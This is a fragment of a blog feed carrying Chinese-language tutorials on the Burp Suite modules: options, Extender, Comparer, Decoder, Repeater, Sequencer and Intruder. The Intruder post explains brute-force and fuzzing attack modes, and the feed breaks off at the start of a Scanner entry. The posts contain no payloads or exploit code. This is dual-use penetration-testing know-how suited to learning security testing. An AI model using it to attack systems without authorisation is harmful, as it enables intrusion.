        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之User options模块(用户选择)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>User options模块主要用来配置一些常用的选项。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p>User options主要由4个模块组成:<br>1.Connections 连接<br>2.SSL<br>3.Display<br>4.Misc  杂项</p><h2 id="Connections-连接"><a href="#Connections-连接" class="headerlink" title="Connections 连接"></a>Connections 连接</h2><p>选项1：Platform Authentication<br>选项2：Upstream Proxy Servers</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/ .png" alt=" "></p><p>选项3：Socks Proxy</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/20190326070457818.png" alt></p><h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><p>选项1：Java SSL Options<br>选项2：Client SSL Certificates</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/20190326070540770.png" alt></p><h2 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h2><p>选项1：User Interface<br>选项2：Http Message Display<br>选项3：Character Sets</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/20190326070549707.png" alt></p><h2 id="Misc-杂项"><a href="#Misc-杂项" class="headerlink" title="Misc  杂项"></a>Misc  杂项</h2><p>选项1：Hotkeys<br>选项2：Logging</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/20190326070623343.png" alt></p><p>选项3：Temporary Files Location<br>选项4：Proxy Interception<br>选项5：Performance Feedback</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之User-options模块/20190326070635952.png" alt> </p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite系列之Project options模块</title>
      <link href="/2018/04/20/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BProject-options%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/04/20/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BProject-options%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Project options模块(项目选择)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Project options主要用来对Project的一些设置。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p>Project options主要由五个模块组成:</p><p>1.Connections 连接<br>2.HTTP<br>3.SSL<br>4.Sessions<br>5.Misc  杂项</p><h2 id="Connections-连接"><a href="#Connections-连接" class="headerlink" title="Connections 连接"></a>Connections 连接</h2><p>选项1：Platform Authentication<br>选项2：Upstream proxy servers<br>选项3：Socks proxy<br>选项4：Timeouts</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065636340.png" alt></p><p>选项5：Hosname Resolution<br>选项6：Out-of-scope Requests</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065644947.png" alt></p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>选项1：Redirections<br>选项2：Streaming responses</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065654000.png" alt></p><p>选项3：status 100 responses</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065717425.png" alt></p><h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><p>选项1：SSL Negotiation<br>选项2：Client SSL Certificates<br>选项3：Server SSL Certificates</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065732041.png" alt></p><h2 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h2><p>选项1：Session Handling Rules<br>选项2：Cookie Jar</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065741753.png" alt></p><p>选项3：Macros</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065749173.png" alt></p><h2 id="Misc-杂项"><a href="#Misc-杂项" class="headerlink" title="Misc  杂项"></a>Misc  杂项</h2><p>选项1：Scheduled Tasks<br>选项2：Burp Collaborator Server</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Project-options模块/20190326065759018.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途,。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite系列之Extender模块</title>
      <link href="/2018/04/16/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BExtender%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/04/16/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BExtender%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Extender模块(扩展器)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp在软件中提供了支持第三方拓展插件的功能，方便使用者编写自己的自定义插件或从插件商店中安装拓展插件。Burp扩展程序可以以多种方式支持自定义Burp的行为，例如：修改HTTP请求和响应，自定义UI，添加自定义扫描程序检查以及访问关键运行时信息，包括代理历史记录，目标站点地图和扫描程序问题等。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p>Extender主要由四个模块组成:</p><p>1.Extensions  扩展<br>2.BApp Store 应用程序商店<br>3.APIS<br>4.Options  选项</p><h2 id="Extensions-扩展"><a href="#Extensions-扩展" class="headerlink" title="Extensions  扩展"></a>Extensions  扩展</h2><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065233876.png" alt></p><p>日志信息的输出有三种方式：<br>a)系统控制台输出<br>b)存储到指定的文件中<br>c)Burp的界面输出 默认情况下，会选择Burp的界面输出。</p><h2 id="BApp-Store-应用程序商店"><a href="#BApp-Store-应用程序商店" class="headerlink" title="BApp Store 应用程序商店"></a>BApp Store 应用程序商店</h2><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065243546.png" alt></p><p>从图中我们可以看出，左边为各个插件的应用列表，当选中某个插件后，右侧显示的为该插件的描述信息和安装信息。 如果我们需要使用某个插件，则点击右侧下方的【install】按钮，进行安装。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065257967.png" alt></p><p>此时，安装按钮置为灰色，同时显示为【installing】，右下角也显示安装中，如上图。安装完成后，界面会显示重新安装【Reinstall】和插件评分按钮【Submit rating】，作为插件商店的用户推荐。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065307128.png" alt></p><p>安装完毕后，在Burp Extender 的Extension的Tab页面中，会自动显示已加载的插件列表。通过插件列表的管<br>理，我们可以对插件进行后期的维护。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065320378.png" alt></p><p>当然，除了从应用商店自动安装插件外，我们也可以下载插件，进行手工安装。如下图：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065327890.png" alt></p><h2 id="APIS"><a href="#APIS" class="headerlink" title="APIS"></a>APIS</h2><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065337811.png" alt></p><h2 id="Options-选项"><a href="#Options-选项" class="headerlink" title="Options  选项"></a>Options  选项</h2><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Extender模块/20190326065346605.png" alt></p><p>下面还有一个Ruby的环境和上面的差不多。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite系列之Comparer模块</title>
      <link href="/2018/04/10/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BComparer%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/04/10/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BComparer%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Comparer模块(比较器)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别。使用中的场景可能是：<br>1.枚举用户名过程中，对比分析登陆成功和失败时，服务器端反馈结果的区别。<br>2.使用 Intruder 进行攻击时，对于不同的服务器端响应，可以很快的分析出两次响应的区别在哪里。<br>3.进行SQL注入的盲注测试时，比较两次响应消息的差异，判断响应结果与注入条件的关联关系。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Comparer模块/20190326064824067.png" alt></p><p>对于Comparer的使用，主要有两个环节组成，先是数据加载，然后是差异分析。 Comparer数据加载的方式常用的有：</p><p>1.从其他Burp工具通过上下文菜单转发过来。<br>2.直接粘贴。<br>3.从文件加载三种方式。</p><p>当加载完毕后，如果你选择了两次不同的请求或应答消息，则下发的比较按钮将被激活，可以选择文本比较或者字节比较。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Comparer模块/20190326064836055.png" alt></p><p>如果点击了【words】或者【bytes】，则进入比对界面，页面自动通过背景颜色显示数据的差异。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite系列之decoder模块</title>
      <link href="/2018/04/06/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8Bdecoder%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/04/06/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8Bdecoder%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之decoder模块(编码模块)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp Decoder是Burp Suite中一款编码解码工具，将原始数据转换成各种编码和哈希表的简单工具，它能够智能地识别多种编码格式采用启发式技术。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之decoder模块/20190326064451278.png" alt></p><p>通过有请求的任意模块的右键菜单send to Decoder或输入数据选择相应的数据格式即可进行解码编码操作，或直接点击Smart decoding进行智能解码。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之decoder模块/20190326064615554.png" alt></p><p>更重要的是，对于同一个数据，我们可以在Decoder的界面，进行多次编码解码的转换。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之decoder模块/20190326064630446.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite系列之Repeater模块</title>
      <link href="/2018/04/04/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BRepeater%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/04/04/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BRepeater%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Repeater模块(中继器)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp Repeater 是一个手动修改并补发个别 HTTP 请求，并分析他们的响应的工具。它最大的用途就是和其他 Burp Suite 工具结合起来。你可以从目标站点地图，从 Burp Proxy 浏览记录，或者从 Burp Intruder 攻击结果上的请求，发送到 Repeater 上，并手动调整这个请求来微调对漏洞的探测或攻击。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Repeater模块/20190326051636510.png" alt><br>1.可以从Proxy history、site map、Scanner等模块中右键菜单send to repeater发送到repeater，对页面数据进行修改发送。<br>2.点击go，发送请求，右边响应请求。<br>3.可以通过“&lt;“和”&gt;“来返回上一次和下一个操作。<br>4.单击”x“可以删除当前测试请求页面。<br>5.底部的功能用于搜索条件，可以用正则表达式，底部右边显示匹配结果数。<br>raw — 这显示纯文本格式的消息。在文本面板的底部有一个搜索和加亮的功能，可以用来快速地定位出消息里的感兴趣的字符串，如出错消息。搜索栏左边的弹出项让你能控制状况的灵敏度，以及是否使用简单文本或者十六进制搜索。<br>params — 对于包含参数(URL 查询字符串，cookie 头，或者消息体)的请求，这个选项把这些参数分析为名字/值的格式，这就可以简单地随他们进行查看和修改了。<br>headers — 这里是以名字/值的格式来显示 HTTP 的消息头，并且也以原始格式显示了消息体。<br>hex — 这里允许你直接编辑由原始二进制数据组成的消息。如果在文本编辑器修改，某种类型的传输(如，MIME 编码的浏览器请求)包含了可能损坏的二进制内容。为了修改这类消息，应该使用十六进制编辑器。<br>该模块的设置在菜单栏 Repeater中，主要选项如下：<br><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Repeater模块/20190326051718288.png" alt><br>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite系列之Sequencer模块</title>
      <link href="/2018/04/02/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BSequencer%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/04/02/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BSequencer%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>BurpSuite系列之Sequencer模块(定序器)<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Burp Sequencer是一种用于分析数据项的一个样本中的随机性质量的工具。你可以用它来测试应用程序的session tokens(会话tokens)或其他重要数据项的本意是不可预测的，比如反弹CSRF tokens，密码重置tokens等。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><p>Burp Sequencer主要由三个模块组成:</p><p>1：Live capture 信息截取<br>2：Manual load 手动加载<br>3：Analysis options 选项分析</p><h2 id="Live-capture-信息截取"><a href="#Live-capture-信息截取" class="headerlink" title="Live capture 信息截取"></a>Live capture 信息截取</h2><p>选项1：Select Live Capture Request</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052051786.png" alt></p><p>选项2：Token Location Within Response</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052109249.png" alt></p><p>选项3：Live Capture Options</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052123554.png" alt></p><h2 id="Manual-load-手动加载"><a href="#Manual-load-手动加载" class="headerlink" title="Manual load 手动加载"></a>Manual load 手动加载</h2><p>选项1：Manual Load</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052159788.png" alt></p><h2 id="Analysis-options-选项分析"><a href="#Analysis-options-选项分析" class="headerlink" title="Analysis options 选项分析"></a>Analysis options 选项分析</h2><p>选项1：Token Handling  令牌处理</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052218850.png" alt></p><p>选项2：Token Analysis  令牌分析</p><p><img src="http://poysl5u4h.bkt.clouddn.com/BurpSuite系列之Sequencer模块/20190326052227473.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite系列之Intruder模块</title>
      <link href="/2018/03/28/Burpsuite%E7%B3%BB%E5%88%97%E4%B9%8BIntruder%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/03/28/Burpsuite%E7%B3%BB%E5%88%97%E4%B9%8BIntruder%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Burpsuite系列之Intruder模块（暴力破解）<br><a id="more"></a></p><h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。</p><h1 id="二、模块说明"><a href="#二、模块说明" class="headerlink" title="二、模块说明"></a>二、模块说明</h1><p>Burp Intruder主要有四个模块组成:</p><p>1：Target 用于配置目标服务器进行攻击的详细信息。<br>2：Positions  设置Payloads的插入点以及攻击类型（攻击模式）。<br>3：Payloads  设置payload，配置字典<br>4：Opetions   此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p><h2 id="Target-目标选项-Target-tab"><a href="#Target-目标选项-Target-tab" class="headerlink" title="Target 目标选项(Target tab)"></a>Target 目标选项(Target tab)</h2><p>这个选项是用来配置目标服务器的细节：<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326045934997.png" alt></p><h2 id="Positions-位置选项-Positions-tab"><a href="#Positions-位置选项-Positions-tab" class="headerlink" title="Positions 位置选项(Positions tab)"></a>Positions 位置选项(Positions tab)</h2><p>这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板：<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326045943778.png" alt><br>使用一对§字符来标记出有效负荷的位置，在这两个符号直接包含了模板文本的内容。当把一个有效负荷放置到一个给出的请求的特殊位置上时，就把这§符号放到这个位置，然后在两个符号之间的出现的文本都会被有效负荷替换。当有个特殊位置没有为一个给出的请求安排有效负荷时(这只适用”sniper”攻击类型)，那个位置的§字符会被删除，出现在它们之间的文本不会变化。</p><p>当使用 Burp Suite 发送一个其他地方的请求时，Burp Intruder 会对你最想放置有效负荷的位置做一个最好的猜测，并且它把这些放置在每个 URL 和主体参数的值里，以及每个cookie 里。每个标记和它中间的文本都会被加亮以显得更清晰。你可以使用 Intruder 菜单上的选项标记的位置是要替换还是附加现有的参数值。在上面的请求编辑器里，指出了定义位置的数量和文本模板的大小。<br>你可以使用选项上的按钮来控制位置上的标记：</p><h4 id="add-§-—-在当前光标位置插入一个位置标记。"><a href="#add-§-—-在当前光标位置插入一个位置标记。" class="headerlink" title="add § — 在当前光标位置插入一个位置标记。"></a>add § — 在当前光标位置插入一个位置标记。</h4><h3 id="clear-§-—-删除整个模板或选中的部分模板里的位置标记。"><a href="#clear-§-—-删除整个模板或选中的部分模板里的位置标记。" class="headerlink" title="clear § — 删除整个模板或选中的部分模板里的位置标记。"></a>clear § — 删除整个模板或选中的部分模板里的位置标记。</h3><h3 id="auto-§-—-这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞-SQL-注入-快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。"><a href="#auto-§-—-这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞-SQL-注入-快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。" class="headerlink" title="auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。"></a>auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。</h3><h3 id="refresh-—-如果需要，可以刷新编辑器里有颜色的代码。"><a href="#refresh-—-如果需要，可以刷新编辑器里有颜色的代码。" class="headerlink" title="refresh — 如果需要，可以刷新编辑器里有颜色的代码。"></a>refresh — 如果需要，可以刷新编辑器里有颜色的代码。</h3><h3 id="clear-—-删除整个编辑器内容。"><a href="#clear-—-删除整个编辑器内容。" class="headerlink" title="clear — 删除整个编辑器内容。"></a>clear — 删除整个编辑器内容。</h3><h2 id="Payloads-有效负荷选项-Payloads-tab"><a href="#Payloads-有效负荷选项-Payloads-tab" class="headerlink" title="Payloads 有效负荷选项(Payloads tab)"></a>Payloads 有效负荷选项(Payloads tab)</h2><p>这个选项是用来配置一个或多个有效负荷的集合。如果定义了”cluster bomb”和”pitchfork”攻击类型，然后必须为每定义的有效负荷位置(最多8个)配置一个单独的有效负荷。使用”payload set”下拉菜单选择要配置的有效负荷。<br>选项1：Payload Sets Payload数量类型设置<br>选项2：Payload Opetions[Simple list]  该选项会根据选项1中Payload type的设置而改变<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050105567.png" alt></p><p>选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050110646.png" alt></p><p>选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050118376.png" alt></p><h2 id="Opetions-选项卡-Options-tab"><a href="#Opetions-选项卡-Options-tab" class="headerlink" title="Opetions  选项卡(Options tab)"></a>Opetions  选项卡(Options tab)</h2><p>此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。<br>选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。</p><p>如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。</p><p>如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。</p><p>如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。<br>选项2：Request Engine 设置发送请求的线程、超时重试等。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050127313.png" alt></p><p>选项3：Attack Results 设置攻击结果的显示。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050133518.png" alt></p><p>选项4：Grep – Match 在响应中找出存在指定的内容的一项。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050138437.png" alt></p><p>选项5：Grep – Extract 通过正则提取返回信息中的内容。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050144205.png" alt></p><p>选项6：Grep – Payloads  这些设置可以用于包含已提交的有效负载的反射的标志结果项目。如果启用了此选项，BurpSuite会添加包含一个复选框指示当前负载的值在每个响应发现新的结果列。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050150284.png" alt></p><p>选项7：Redirections 重定向响应，控制Burp在进行攻击时如何处理重定向。<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326050203273.png" alt></p><h1 id="Burp-Suite-Intruder的4种攻击类型"><a href="#Burp-Suite-Intruder的4种攻击类型" class="headerlink" title="Burp Suite Intruder的4种攻击类型"></a>Burp Suite Intruder的4种攻击类型</h1><h2 id="Sniper（狙击手模式）"><a href="#Sniper（狙击手模式）" class="headerlink" title="Sniper（狙击手模式）"></a>Sniper（狙击手模式）</h2><p>狙击手模式使用一组payload集合，它一次只使用一个payload位置，假设你标记了两个位置“A”和“B”，payload值为“1”和“2”，那么它攻击会形成以下组合（除原始数据外）：<img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/attack NO.location Alocation B11no replace22no replace3no replace14no replace2二Battering ram（.png" alt="attack NO.location Alocation B11no replace22no replace3no replace14no replace2"></p><h2 id="Battering-ram（攻城锤模式）"><a href="#Battering-ram（攻城锤模式）" class="headerlink" title="Battering ram（攻城锤模式）"></a>Battering ram（攻城锤模式）</h2><p>攻城锤模式与狙击手模式类似的地方是，同样只使用一个payload集合，不同的地方在于每次攻击都是替换所有payload标记位置，而狙击手模式每次只能替换一个payload标记位置。<img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/attack NO.location Alocation B111222.png" alt="attack NO.location Alocation B111222"></p><h2 id="Pitchfork（草叉模式）"><a href="#Pitchfork（草叉模式）" class="headerlink" title="Pitchfork（草叉模式）"></a>Pitchfork（草叉模式）</h2><p>草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，则攻击模式如下：<br><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326051341304.png" alt></p><h2 id="Cluster-bomb（集束炸弹模式）"><a href="#Cluster-bomb（集束炸弹模式）" class="headerlink" title="Cluster bomb（集束炸弹模式）"></a>Cluster bomb（集束炸弹模式）</h2><p>集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除baseline请求外，会有四次请求：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/Burpsuite系列之Intruder模块/20190326051412843.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Burpsuite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite系列之Scanner模块</title>
      <link href="/2018/03/26/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BScanner%E6%A8%A1%E5%9D%97/"/>
      <url>/2018/03/26/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BScanner%E6%A8%A1%E5%9D%97/</url>
      
